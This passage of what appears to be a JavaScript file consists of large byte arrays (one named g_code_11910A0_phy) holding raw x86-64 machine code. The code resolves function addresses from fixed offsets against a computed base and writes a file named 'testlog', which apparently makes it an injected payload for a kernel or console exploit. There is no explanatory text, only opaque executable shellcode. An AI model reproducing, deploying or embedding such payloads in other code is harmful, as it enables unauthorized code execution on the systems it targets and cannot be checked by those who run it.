	0xFF, 0x48, 0x29, 0xC2, 0x48, 0x89, 0xD0, 0x48, 0x89, 0x85, 0x18, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 
	0x85, 0x18, 0xFF, 0xFF, 0xFF, 0x89, 0xC0, 0x48, 0x89, 0x85, 0x20, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 
	0x85, 0x08, 0xFF, 0xFF, 0xFF, 0x48, 0x05, 0x88, 0x00, 0x00, 0x00, 0x8B, 0x00, 0x48, 0x8B, 0x95, 
	0x10, 0xFF, 0xFF, 0xFF, 0x39, 0xD0, 0x0F, 0x84, 0xA6, 0x05, 0x00, 0x00, 0x48, 0xC7, 0x85, 0x28, 
	0xFF, 0xFF, 0xFF, 0x00, 0xB8, 0xCA, 0x02, 0x48, 0x8B, 0x85, 0x28, 0xFF, 0xFF, 0xFF, 0x48, 0x05, 
	0x10, 0x08, 0x00, 0x00, 0x48, 0x89, 0x85, 0x30, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x85, 0x30, 0xFF, 
	0xFF, 0xFF, 0x8B, 0x00, 0x89, 0x85, 0x7C, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0x85, 0x30, 0xFF, 0xFF, 
	0xFF, 0x48, 0x83, 0xC0, 0x04, 0x48, 0x89, 0x85, 0x38, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x85, 0x08, 
	0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xE8, 0x80, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x85, 0x40, 0xFF, 0xFF, 
	0xFF, 0x48, 0x8B, 0x85, 0x08, 0xFF, 0xFF, 0xFF, 0x48, 0x05, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 
	0x00, 0x48, 0x89, 0x85, 0x48, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x85, 0x48, 0xFF, 0xFF, 0xFF, 0x48, 
	0x2B, 0x85, 0x40, 0xFF, 0xFF, 0xFF, 0x89, 0x85, 0x80, 0xFE, 0xFF, 0xFF, 0xC7, 0x85, 0x6C, 0xFE, 
	0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x85, 0x70, 0xFE, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 
	0xE9, 0xD5, 0x00, 0x00, 0x00, 0xC7, 0x85, 0x74, 0xFE, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x8B, 
	0x85, 0x70, 0xFE, 0xFF, 0xFF, 0x89, 0x85, 0x78, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0x85, 0x38, 0xFF, 
	0xFF, 0xFF, 0x48, 0x89, 0x85, 0xA8, 0xFE, 0xFF, 0xFF, 0xE9, 0x8A, 0x00, 0x00, 0x00, 0x48, 0x83, 
	0x85, 0xA8, 0xFE, 0xFF, 0xFF, 0x01, 0x83, 0x85, 0x78, 0xFE, 0xFF, 0xFF, 0x01, 0x48, 0x8B, 0x85, 
	0xA8, 0xFE, 0xFF, 0xFF, 0x0F, 0xB6, 0x00, 0x84, 0xC0, 0x74, 0x24, 0x48, 0x8B, 0x85, 0xA8, 0xFE, 
	0xFF, 0xFF, 0x0F, 0xB6, 0x10, 0x8B, 0x85, 0x78, 0xFE, 0xFF, 0xFF, 0x48, 0x63, 0xC8, 0x48, 0x8B, 
	0x85, 0x40, 0xFF, 0xFF, 0xFF, 0x48, 0x01, 0xC8, 0x0F, 0xB6, 0x00, 0x38, 0xC2, 0x74, 0xBF, 0x48, 
	0x8B, 0x85, 0xA8, 0xFE, 0xFF, 0xFF, 0x0F, 0xB6, 0x00, 0x84, 0xC0, 0x74, 0x2F, 0x90, 0x48, 0x8B, 
	0x85, 0xA8, 0xFE, 0xFF, 0xFF, 0x48, 0x8D, 0x50, 0x01, 0x48, 0x89, 0x95, 0xA8, 0xFE, 0xFF, 0xFF, 
	0x0F, 0xB6, 0x00, 0x84, 0xC0, 0x75, 0xE7, 0x83, 0x85, 0x74, 0xFE, 0xFF, 0xFF, 0x01, 0x8B, 0x85, 
	0x70, 0xFE, 0xFF, 0xFF, 0x89, 0x85, 0x78, 0xFE, 0xFF, 0xFF, 0xEB, 0x0C, 0xC7, 0x85, 0x6C, 0xFE, 
	0xFF, 0xFF, 0x01, 0x00, 0x00, 0x00, 0xEB, 0x12, 0x8B, 0x85, 0x74, 0xFE, 0xFF, 0xFF, 0x3B, 0x85, 
	0x7C, 0xFE, 0xFF, 0xFF, 0x0F, 0x8C, 0x73, 0xFF, 0xFF, 0xFF, 0x83, 0xBD, 0x6C, 0xFE, 0xFF, 0xFF, 
	0x00, 0x75, 0x1B, 0x83, 0x85, 0x70, 0xFE, 0xFF, 0xFF, 0x01, 0x8B, 0x85, 0x70, 0xFE, 0xFF, 0xFF, 
	0x3B, 0x85, 0x80, 0xFE, 0xFF, 0xFF, 0x0F, 0x8C, 0x19, 0xFF, 0xFF, 0xFF, 0xEB, 0x01, 0x90, 0xC6, 
	0x45, 0xE0, 0x74, 0xC6, 0x45, 0xE1, 0x65, 0xC6, 0x45, 0xE2, 0x73, 0xC6, 0x45, 0xE3, 0x74, 0xC6, 
	0x45, 0xE4, 0x6C, 0xC6, 0x45, 0xE5, 0x6F, 0xC6, 0x45, 0xE6, 0x67, 0xC6, 0x45, 0xE7, 0x00, 0xB8, 
	0x60, 0x6D, 0x29, 0x04, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x85, 0x50, 0xFF, 0xFF, 0xFF, 0xB8, 0xE0, 
	0x57, 0x29, 0x04, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x85, 0x58, 0xFF, 0xFF, 0xFF, 0xB8, 0xF0, 0x50, 
	0x29, 0x04, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x85, 0x60, 0xFF, 0xFF, 0xFF, 0x48, 0x8D, 0x45, 0xE0, 
	0x48, 0x8B, 0x8D, 0x58, 0xFF, 0xFF, 0xFF, 0xBA, 0xA4, 0x01, 0x00, 0x00, 0xBE, 0x41, 0x04, 0x00, 
	0x00, 0x48, 0x89, 0xC7, 0xFF, 0xD1, 0x89, 0x85, 0x84, 0xFE, 0xFF, 0xFF, 0x8B, 0x85, 0x80, 0xFE, 
	0xFF, 0xFF, 0x48, 0x63, 0xD0, 0x48, 0x8B, 0x8D, 0x40, 0xFF, 0xFF, 0xFF, 0x8B, 0x85, 0x84, 0xFE, 
	0xFF, 0xFF, 0x4C, 0x8B, 0x85, 0x50, 0xFF, 0xFF, 0xFF, 0x48, 0x89, 0xCE, 0x89, 0xC7, 0x41, 0xFF, 
	0xD0, 0x48, 0x89, 0x85, 0x68, 0xFF, 0xFF, 0xFF, 0x8B, 0x85, 0x84, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 
	0x95, 0x60, 0xFF, 0xFF, 0xFF, 0x89, 0xC7, 0xFF, 0xD2, 0x83, 0xBD, 0x6C, 0xFE, 0xFF, 0xFF, 0x00, 
	0x0F, 0x85, 0xE1, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x18, 0xFF, 0xFF, 0xFF, 0x89, 0xC2, 0x48, 
	0x8B, 0x85, 0x10, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x8D, 0xD0, 0xFE, 0xFF, 0xFF, 0xBE, 0x00, 0xE3, 
	0x73, 0x06, 0x48, 0x89, 0xC7, 0xFF, 0xD1, 0x89, 0x85, 0x88, 0xFE, 0xFF, 0xFF, 0x8B, 0x85, 0x88, 
	0xFE, 0xFF, 0xFF, 0x89, 0x85, 0x8C, 0xFE, 0xFF, 0xFF, 0x83, 0xBD, 0x88, 0xFE, 0xFF, 0xFF, 0x00, 
	0x7F, 0x0F, 0xC7, 0x85, 0x68, 0xFE, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0xE9, 0xF3, 0x02, 0x00, 
	0x00, 0x8B, 0x95, 0x88, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0x85, 0x08, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 
	0x8D, 0xD8, 0xFE, 0xFF, 0xFF, 0xBE, 0x00, 0xE3, 0x73, 0x06, 0x48, 0x89, 0xC7, 0xFF, 0xD1, 0x89, 
	0x85, 0x90, 0xFE, 0xFF, 0xFF, 0xC7, 0x85, 0x68, 0xFE, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x83, 
	0xBD, 0x90, 0xFE, 0xFF, 0xFF, 0x00, 0x0F, 0x85, 0xB8, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x08, 
	0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC0, 0x70, 0x48, 0x89, 0xC1, 0x48, 0x8B, 0x85, 0x08, 0xFF, 0xFF, 
	0xFF, 0x48, 0x83, 0xC0, 0x78, 0x48, 0x89, 0xC2, 0x8B, 0x01, 0x89, 0x02, 0x83, 0xBD, 0x50, 0xFE, 
	0xFF, 0xFF, 0x01, 0x75, 0x2C, 0x8B, 0x85, 0x8C, 0xFE, 0xFF, 0xFF, 0x48, 0x98, 0x48, 0x8D, 0x50, 
	0x04, 0x48, 0x8B, 0x85, 0x58, 0xFE, 0xFF, 0xFF, 0x48, 0x83, 0xC0, 0x24, 0x8B, 0x00, 0x89, 0xC1, 
	0x48, 0x8B, 0x85, 0xE0, 0xFE, 0xFF, 0xFF, 0x48, 0x89, 0xD6, 0x48, 0x89, 0xCF, 0xFF, 0xD0, 0xEB, 
	0x1C, 0x8B, 0x85, 0x8C, 0xFE, 0xFF, 0xFF, 0x8D, 0x48, 0x04, 0x8B, 0x85, 0x54, 0xFE, 0xFF, 0xFF, 
	0x48, 0x8B, 0x95, 0xE8, 0xFE, 0xFF, 0xFF, 0x89, 0xCE, 0x89, 0xC7, 0xFF, 0xD2, 0x8B, 0x85, 0x8C, 
	0xFE, 0xFF, 0xFF, 0x8D, 0x48, 0x04, 0x48, 0x8B, 0x85, 0x58, 0xFE, 0xFF, 0xFF, 0x48, 0x83, 0xC0, 
	0x24, 0x8B, 0x00, 0x89, 0xC7, 0x8B, 0x95, 0x54, 0xFE, 0xFF, 0xFF, 0x8B, 0x85, 0x50, 0xFE, 0xFF, 
	0xFF, 0x4C, 0x8B, 0x85, 0xF0, 0xFE, 0xFF, 0xFF, 0x89, 0xC6, 0x41, 0xFF, 0xD0, 0x48, 0x8B, 0x85, 
	0x08, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC0, 0x18, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x45, 0x88, 0x48, 
	0x8B, 0x85, 0x08, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC0, 0x74, 0x8B, 0x00, 0x89, 0xC0, 0x48, 0xC1, 
	0xE0, 0x22, 0x48, 0x89, 0xC2, 0x48, 0x8B, 0x85, 0x08, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC0, 0x70, 
	0x8B, 0x00, 0x89, 0xC0, 0x25, 0xFF, 0xFF, 0xFF, 0x3F, 0x48, 0xC1, 0xE0, 0x04, 0x48, 0x09, 0xD0, 
	0x48, 0x83, 0xC8, 0x01, 0x48, 0x89, 0x45, 0xA0, 0x48, 0x83, 0x7D, 0x88, 0x00, 0x74, 0x3C, 0x48, 
	0x8B, 0x55, 0x88, 0x48, 0x8D, 0x45, 0xA0, 0x4C, 0x8B, 0x85, 0xC0, 0xFE, 0xFF, 0xFF, 0x48, 0x89, 
	0xD1, 0xBA, 0x01, 0x00, 0x00, 0x00, 0xBE, 0x08, 0x00, 0x00, 0x00, 0x48, 0x89, 0xC7, 0x41, 0xFF, 
	0xD0, 0x48, 0x8B, 0x85, 0x08, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC0, 0x18, 0x48, 0x8B, 0x00, 0x48, 
	0x8B, 0x95, 0xC8, 0xFE, 0xFF, 0xFF, 0x48, 0x89, 0xC7, 0xFF, 0xD2, 0x48, 0xC7, 0x85, 0xA0, 0xFE, 
	0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x08, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC0, 
	0x10, 0x48, 0x8B, 0x00, 0x48, 0x89, 0xC1, 0x48, 0x8B, 0x85, 0x08, 0xFF, 0xFF, 0xFF, 0x48, 0x8D, 
	0x90, 0xA8, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x85, 0xF8, 0xFE, 0xFF, 0xFF, 0x48, 0x89, 0xCE, 0x48, 
	0x89, 0xD7, 0xFF, 0xD0, 0x48, 0x8B, 0x85, 0x08, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC0, 0x20, 0x0F, 
	0xB6, 0x00, 0x84, 0xC0, 0x0F, 0x84, 0x95, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x85, 0xA0, 0xFE, 0xFF, 
	0xFF, 0x48, 0x8D, 0x50, 0x01, 0x48, 0x89, 0x95, 0xA0, 0xFE, 0xFF, 0xFF, 0x48, 0x89, 0xC2, 0x48, 
	0xC1, 0xE2, 0x03, 0x48, 0x29, 0xC2, 0x48, 0x89, 0xD0, 0x48, 0x89, 0x45, 0x90, 0x48, 0x8B, 0x85, 
	0x08, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC0, 0x28, 0x48, 0x8B, 0x00, 0x48, 0x8B, 0x55, 0x90, 0x48, 
	0xC1, 0xE2, 0x03, 0x48, 0x01, 0xD0, 0x48, 0x83, 0xC0, 0x08, 0x48, 0x8B, 0x00, 0x48, 0x89, 0xC1, 
	0x48, 0x8B, 0x85, 0x08, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC0, 0x28, 0x48, 0x8B, 0x00, 0x48, 0x8B, 
	0x55, 0x90, 0x48, 0xC1, 0xE2, 0x03, 0x48, 0x01, 0xD0, 0x48, 0x83, 0xC0, 0x10, 0x48, 0x89, 0xC2, 
	0x48, 0x8B, 0x85, 0xF8, 0xFE, 0xFF, 0xFF, 0x48, 0x89, 0xCE, 0x48, 0x89, 0xD7, 0xFF, 0xD0, 0x48, 
	0x8B, 0x85, 0x08, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC0, 0x20, 0x0F, 0xB6, 0x00, 0x0F, 0xBE, 0xC0, 
	0x48, 0x8B, 0x95, 0xA0, 0xFE, 0xFF, 0xFF, 0x39, 0xD0, 0x0F, 0x8F, 0x6B, 0xFF, 0xFF, 0xFF, 0x48, 
	0x8B, 0x85, 0x08, 0xFF, 0xFF, 0xFF, 0x48, 0x05, 0x20, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x00, 0x48, 
	0x89, 0x45, 0x98, 0x48, 0x83, 0x7D, 0x98, 0x00, 0x74, 0x21, 0x48, 0x8B, 0x45, 0x98, 0x48, 0x8B, 
	0x00, 0x48, 0x89, 0xC1, 0x48, 0x8B, 0x45, 0x98, 0x48, 0x8D, 0x50, 0x02, 0x48, 0x8B, 0x85, 0xF8, 
	0xFE, 0xFF, 0xFF, 0x48, 0x89, 0xCE, 0x48, 0x89, 0xD7, 0xFF, 0xD0, 0xC7, 0x85, 0x68, 0xFE, 0xFF, 
	0xFF, 0x01, 0x00, 0x00, 0x00, 0xEB, 0x5D, 0xB8, 0x78, 0x48, 0x29, 0x04, 0x48, 0x8B, 0x00, 0x48, 
	0x89, 0x85, 0x70, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x85, 0x70, 0xFF, 0xFF, 0xFF, 0x48, 0x89, 0x85, 
	0x78, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x85, 0x08, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC0, 0x08, 0x48, 
	0x8B, 0x00, 0x48, 0x89, 0x45, 0x80, 0x48, 0x8B, 0x85, 0x08, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC0, 
	0x74, 0x8B, 0x00, 0x89, 0xC6, 0x48, 0x8B, 0x45, 0x80, 0x48, 0x8B, 0x8D, 0x78, 0xFF, 0xFF, 0xFF, 
	0xBA, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0xC7, 0xFF, 0xD1, 0xC7, 0x85, 0x68, 0xFE, 0xFF, 0xFF, 
	0x01, 0x00, 0x00, 0x00, 0x8B, 0x85, 0x68, 0xFE, 0xFF, 0xFF, 0x89, 0x85, 0x94, 0xFE, 0xFF, 0xFF, 
	0x48, 0x8B, 0x85, 0x08, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xE8, 0x80, 0x48, 0x89, 0xC2, 0x48, 0x8B, 
	0x85, 0x00, 0xFF, 0xFF, 0xFF, 0x48, 0x89, 0xD7, 0xFF, 0xD0, 0x8B, 0x85, 0x94, 0xFE, 0xFF, 0xFF, 
	0xEB, 0x07, 0x48, 0x8B, 0x85, 0x20, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x75, 0xF8, 0x64, 0x48, 0x33, 
	0x34, 0x25, 0x28, 0x00, 0x00, 0x00, 0x74, 0x05, 0xE8, 0x13, 0xF0, 0xFF, 0xFF, 0xC9, 0xC3, 0xE9, 
	0xAC, 0x00, 0x00, 0x00, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 
	0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 
	0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x66, 0x2E, 0x0F, 
	0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x66, 0x2E, 
	0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x66, 
	0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x1F, 0x80, 0x00, 0x00, 0x00, 0x00

]);


const g_code_11910A0_phy = Buffer.from([

	0xF3, 0x0F, 0x1E, 0xFA, 0x55, 0x48, 0x89, 0xE5, 0x48, 0x81, 0xEC, 0x70, 0x01, 0x00, 0x00, 0x48, 
	0x89, 0xBD, 0x98, 0xFE, 0xFF, 0xFF, 0x89, 0xB5, 0x94, 0xFE, 0xFF, 0xFF, 0x89, 0x95, 0x90, 0xFE, 
	0xFF, 0xFF, 0x64, 0x48, 0x8B, 0x04, 0x25, 0x28, 0x00, 0x00, 0x00, 0x48, 0x89, 0x45, 0xF8, 0x31, 
	0xC0, 0x48, 0xC7, 0x85, 0xF0, 0xFE, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x00, 
	0x00, 0x00, 0x00, 0x48, 0x89, 0x85, 0xF0, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0x85, 0xF0, 0xFE, 0xFF, 
	0xFF, 0x48, 0xBA, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x48, 0x21, 0xD0, 0x48, 0x83, 
	0xE8, 0x10, 0x48, 0x89, 0x85, 0xF8, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0x85, 0xF8, 0xFE, 0xFF, 0xFF, 
	0x48, 0x8B, 0x00, 0x48, 0x89, 0x85, 0x00, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x85, 0x00, 0xFF, 0xFF, 
	0xFF, 0x48, 0x05, 0x10, 0x5E, 0x1D, 0x03, 0x48, 0x89, 0x85, 0x08, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 
	0x85, 0x00, 0xFF, 0xFF, 0xFF, 0x48, 0x05, 0x60, 0xD9, 0x3C, 0x01, 0x48, 0x89, 0x85, 0x10, 0xFF, 
	0xFF, 0xFF, 0x48, 0x8B, 0x85, 0x00, 0xFF, 0xFF, 0xFF, 0x48, 0x05, 0x50, 0x3B, 0xFF, 0x02, 0x48, 
	0x89, 0x85, 0x18, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x85, 0x00, 0xFF, 0xFF, 0xFF, 0x48, 0x05, 0x80, 
	0x40, 0x3D, 0x01, 0x48, 0x89, 0x85, 0x20, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x85, 0x00, 0xFF, 0xFF, 
	0xFF, 0x48, 0x05, 0x60, 0x0C, 0xFE, 0x02, 0x48, 0x89, 0x85, 0x28, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 
	0x85, 0x00, 0xFF, 0xFF, 0xFF, 0x48, 0x05, 0xC0, 0xD8, 0x3C, 0x01, 0x48, 0x89, 0x85, 0x30, 0xFF, 
	0xFF, 0xFF, 0x48, 0x8B, 0x85, 0x00, 0xFF, 0xFF, 0xFF, 0x48, 0x05, 0x50, 0x07, 0x3D, 0x01, 0x48, 
	0x89, 0x85, 0x38, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x85, 0x00, 0xFF, 0xFF, 0xFF, 0x48, 0x05, 0xF0, 
	0x33, 0xFD, 0x02, 0x48, 0x89, 0x85, 0x40, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x85, 0x98, 0xFE, 0xFF, 
	0xFF, 0x48, 0x05, 0xF0, 0x26, 0x00, 0x00, 0x48, 0x89, 0x85, 0xD8, 0xFE, 0xFF, 0xFF, 0x83, 0xBD, 
	0x90, 0xFE, 0xFF, 0xFF, 0x01, 0x75, 0x14, 0x48, 0x8B, 0x85, 0x98, 0xFE, 0xFF, 0xFF, 0x48, 0x05, 
	0xE0, 0x47, 0x00, 0x00, 0x48, 0x89, 0x85, 0xD8, 0xFE, 0xFF, 0xFF, 0x8B, 0x85, 0x94, 0xFE, 0xFF, 
	0xFF, 0x48, 0x63, 0xD0, 0x48, 0x89, 0xD0, 0x48, 0xC1, 0xE0, 0x03, 0x48, 0x01, 0xD0, 0x48, 0xC1, 
	0xE0, 0x02, 0x48, 0x01, 0xD0, 0x48, 0xC1, 0xE0, 0x03, 0x48, 0x89, 0xC2, 0x48, 0x8B, 0x85, 0xD8, 
	0xFE, 0xFF, 0xFF, 0x48, 0x01, 0xD0, 0x48, 0x89, 0x85, 0x48, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x85, 
	0x48, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xE8, 0x80, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x85, 0x50, 0xFF, 
	0xFF, 0xFF, 0x48, 0x8B, 0x85, 0x48, 0xFF, 0xFF, 0xFF, 0x48, 0x05, 0x88, 0x00, 0x00, 0x00, 0x48, 
	0x8B, 0x10, 0x48, 0x8B, 0x85, 0x50, 0xFF, 0xFF, 0xFF, 0x48, 0x29, 0xC2, 0x48, 0x89, 0xD0, 0x48, 
	0x89, 0x85, 0x58, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x85, 0x58, 0xFF, 0xFF, 0xFF, 0x89, 0xC0, 0x48, 
	0x89, 0x85, 0x60, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x85, 0x48, 0xFF, 0xFF, 0xFF, 0x48, 0x05, 0x88, 
	0x00, 0x00, 0x00, 0x8B, 0x00, 0x48, 0x8B, 0x95, 0x50, 0xFF, 0xFF, 0xFF, 0x39, 0xD0, 0x0F, 0x84, 
	0x3B, 0x05, 0x00, 0x00, 0x48, 0x8B, 0x85, 0xF8, 0xFE, 0xFF, 0xFF, 0x48, 0x05, 0x00, 0x5C, 0x46, 
	0x00, 0x48, 0x89, 0x85, 0x68, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x85, 0x68, 0xFF, 0xFF, 0xFF, 0x48, 
	0x05, 0x10, 0x09, 0x00, 0x00, 0x48, 0x89, 0x85, 0x70, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x85, 0x70, 
	0xFF, 0xFF, 0xFF, 0x8B, 0x00, 0x89, 0x85, 0xBC, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0x85, 0x70, 0xFF, 
	0xFF, 0xFF, 0x48, 0x83, 0xC0, 0x04, 0x48, 0x89, 0x85, 0x78, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x85, 
	0x48, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xE8, 0x80, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x45, 0x80, 0x48, 
	0x8B, 0x85, 0x48, 0xFF, 0xFF, 0xFF, 0x48, 0x05, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x00, 0x48, 
	0x89, 0x45, 0x88, 0x48, 0x8B, 0x45, 0x88, 0x48, 0x2B, 0x45, 0x80, 0x89, 0x85, 0xC0, 0xFE, 0xFF, 
	0xFF, 0xC7, 0x85, 0xAC, 0xFE, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x85, 0xB0, 0xFE, 0xFF, 
	0xFF, 0x00, 0x00, 0x00, 0x00, 0xE9, 0xD2, 0x00, 0x00, 0x00, 0xC7, 0x85, 0xB4, 0xFE, 0xFF, 0xFF, 
	0x00, 0x00, 0x00, 0x00, 0x8B, 0x85, 0xB0, 0xFE, 0xFF, 0xFF, 0x89, 0x85, 0xB8, 0xFE, 0xFF, 0xFF, 
	0x48, 0x8B, 0x85, 0x78, 0xFF, 0xFF, 0xFF, 0x48, 0x89, 0x85, 0xE8, 0xFE, 0xFF, 0xFF, 0xE9, 0x87, 
	0x00, 0x00, 0x00, 0x48, 0x83, 0x85, 0xE8, 0xFE, 0xFF, 0xFF, 0x01, 0x83, 0x85, 0xB8, 0xFE, 0xFF, 
	0xFF, 0x01, 0x48, 0x8B, 0x85, 0xE8, 0xFE, 0xFF, 0xFF, 0x0F, 0xB6, 0x00, 0x84, 0xC0, 0x74, 0x21, 
	0x48, 0x8B, 0x85, 0xE8, 0xFE, 0xFF, 0xFF, 0x0F, 0xB6, 0x10, 0x8B, 0x85, 0xB8, 0xFE, 0xFF, 0xFF, 
	0x48, 0x63, 0xC8, 0x48, 0x8B, 0x45, 0x80, 0x48, 0x01, 0xC8, 0x0F, 0xB6, 0x00, 0x38, 0xC2, 0x74, 
	0xC2, 0x48, 0x8B, 0x85, 0xE8, 0xFE, 0xFF, 0xFF, 0x0F, 0xB6, 0x00, 0x84, 0xC0, 0x74, 0x2F, 0x90, 
	0x48, 0x8B, 0x85, 0xE8, 0xFE, 0xFF, 0xFF, 0x48, 0x8D, 0x50, 0x01, 0x48, 0x89, 0x95, 0xE8, 0xFE, 
	0xFF, 0xFF, 0x0F, 0xB6, 0x00, 0x84, 0xC0, 0x75, 0xE7, 0x83, 0x85, 0xB4, 0xFE, 0xFF, 0xFF, 0x01, 
	0x8B, 0x85, 0xB0, 0xFE, 0xFF, 0xFF, 0x89, 0x85, 0xB8, 0xFE, 0xFF, 0xFF, 0xEB, 0x0C, 0xC7, 0x85, 
	0xAC, 0xFE, 0xFF, 0xFF, 0x01, 0x00, 0x00, 0x00, 0xEB, 0x12, 0x8B, 0x85, 0xB4, 0xFE, 0xFF, 0xFF, 
	0x3B, 0x85, 0xBC, 0xFE, 0xFF, 0xFF, 0x0F, 0x8C, 0x76, 0xFF, 0xFF, 0xFF, 0x83, 0xBD, 0xAC, 0xFE, 
	0xFF, 0xFF, 0x00, 0x75, 0x1B, 0x83, 0x85, 0xB0, 0xFE, 0xFF, 0xFF, 0x01, 0x8B, 0x85, 0xB0, 0xFE, 
	0xFF, 0xFF, 0x3B, 0x85, 0xC0, 0xFE, 0xFF, 0xFF, 0x0F, 0x8C, 0x1C, 0xFF, 0xFF, 0xFF, 0xEB, 0x01, 
	0x90, 0xC6, 0x45, 0xE0, 0x74, 0xC6, 0x45, 0xE1, 0x65, 0xC6, 0x45, 0xE2, 0x73, 0xC6, 0x45, 0xE3, 
	0x74, 0xC6, 0x45, 0xE4, 0x6C, 0xC6, 0x45, 0xE5, 0x6F, 0xC6, 0x45, 0xE6, 0x67, 0xC6, 0x45, 0xE7, 
	0x00, 0x48, 0x8B, 0x85, 0x00, 0xFF, 0xFF, 0xFF, 0x48, 0x05, 0x68, 0xF4, 0xFE, 0x04, 0x48, 0x8B, 
	0x00, 0x48, 0x89, 0x45, 0x90, 0x48, 0x8B, 0x85, 0x00, 0xFF, 0xFF, 0xFF, 0x48, 0x05, 0xD8, 0xDD, 
	0xFE, 0x04, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x45, 0x98, 0x48, 0x8B, 0x85, 0x00, 0xFF, 0xFF, 0xFF, 
	0x48, 0x05, 0x90, 0xD6, 0xFE, 0x04, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x45, 0xA0, 0x48, 0x8D, 0x45, 
